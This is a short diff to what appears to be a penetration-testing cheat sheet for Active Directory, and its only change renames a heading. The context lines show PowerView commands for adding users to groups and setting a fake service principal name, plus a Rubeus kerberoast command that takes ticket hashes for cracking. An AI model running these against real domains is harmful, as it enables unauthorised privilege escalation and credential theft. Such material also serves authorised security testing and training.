@@ -39,7 +39,7 @@ Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential <CRED> -
 Get-ADGroup -Identity "<GROUP>" -Properties * | Select -ExpandProperty Members
 Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName
 ```
-#### Fake SPN - Kerberoastable
+#### Set Fake SPN - Kerberoastable
 ```
 Set-DomainObject -Credential <CRED> -Identity <USERNAME> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 .\Rubeus.exe kerberoast /user:<USER> /nowrap /tgtdeleg
